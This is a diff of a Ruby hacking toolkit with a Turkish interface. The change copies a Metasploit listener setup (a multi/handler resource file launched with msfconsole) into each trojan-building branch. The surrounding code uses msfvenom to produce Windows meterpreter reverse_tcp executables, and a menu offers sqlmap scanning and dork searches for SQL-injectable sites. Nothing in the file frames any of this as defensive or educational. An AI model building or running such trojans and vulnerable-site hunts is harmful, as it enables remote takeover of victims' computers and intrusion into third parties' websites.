@@ -26,16 +26,6 @@ BY : QUEY7Z   |  TERMUX - LİNUX - WİNDOWS KULLANCILARI İÇİN TASARLANDI.
 ================================================================================="
 end
 
-def dinleme
-    dosya = File.open("dinleme_ayarlari.txt", "w")
-            dosya.write("set lhost #{lhost}")
-            dosya.write("\nset lport #{lport}")
-            dosya.write("\nset payload #{payload}")
-            dosya.write("\nuse exploit/multi/handler")
-            dosya.write("\nexploit")
-            dosya.close()
-            system("msfconsole -r dinleme_ayarlari.txt")
-end
 def msfvenom
     sistem = OS.windows?
     sistem2 = OS.linux?
@@ -73,7 +63,14 @@ Trojan Türü
             print "Trojan dinlemeye alınsın mı (e/h) : ".yellow
             eh = gets.chop
             if eh == "e"
-                dinleme
+                dosya = File.open("dinleme_ayarlari.txt", "w")
+                    dosya.write("set lhost #{lhost}")
+                    dosya.write("\nset lport #{lport}")
+                    dosya.write("\nset payload #{payload}")
+                    dosya.write("\nuse exploit/multi/handler")
+                    dosya.write("\nexploit")
+                    dosya.close()
+                system("msfconsole -r dinleme_ayarlari.txt")
             end
 
         elsif islem == 2
@@ -89,7 +86,14 @@ Trojan Türü
 
             system("msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} -f exe -o #{dizin}")
             if eh == "e"
-                dinleme
+                dosya = File.open("dinleme_ayarlari.txt", "w")
+                    dosya.write("set lhost #{lhost}")
+                    dosya.write("\nset lport #{lport}")
+                    dosya.write("\nset payload #{payload}")
+                    dosya.write("\nuse exploit/multi/handler")
+                    dosya.write("\nexploit")
+                    dosya.close()
+                system("msfconsole -r dinleme_ayarlari.txt")
             end
             
         elsif islem == 3
@@ -105,7 +109,14 @@ Trojan Türü
 
             system("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} -f exe -o #{dizin}")
             if eh == "e"
-                dinleme
+                dosya = File.open("dinleme_ayarlari.txt", "w")
+                    dosya.write("set lhost #{lhost}")
+                    dosya.write("\nset lport #{lport}")
+                    dosya.write("\nset payload #{payload}")
+                    dosya.write("\nuse exploit/multi/handler")
+                    dosya.write("\nexploit")
+                    dosya.close()
+                system("msfconsole -r dinleme_ayarlari.txt")
             end
         else
             system("cls")
@@ -127,8 +138,12 @@ def sqlmap
 
     if isletim == "1"
         system("cls")
-        puts "NOT : SQLMAP'İ İNDİRİN VE HEİSENBERG YAZILIMINI SQLMAP.PY DOSYASIYLA AYNI KONUMA ATIN. ARDINDAN PROGRAMI TEKRAR BAŞLATIN. (OTOMATİK MESAJDIR, SÖYLENENLERİ YAPSANIZ BİLE GÖSTERİLECEKTİR.)".red
-        puts "NOT : PYTHON2 İNDİRİN.".red
+        system("clear")
+        testcikk = OS.linux?
+        if testcikk == false
+            puts "NOT : SQLMAP'İ İNDİRİN VE HEİSENBERG YAZILIMINI SQLMAP.PY DOSYASIYLA AYNI KONUMA ATIN. ARDINDAN PROGRAMI TEKRAR BAŞLATIN. (OTOMATİK MESAJDIR, SÖYLENENLERİ YAPSANIZ BİLE GÖSTERİLECEKTİR.)".red
+            puts "NOT : PYTHON2 İNDİRİN.".red
+        end
         puts "
 1) SQL açıklı site tarama
 2) SQL açıklı siteyi dork yardımıyla bulma (dork search)
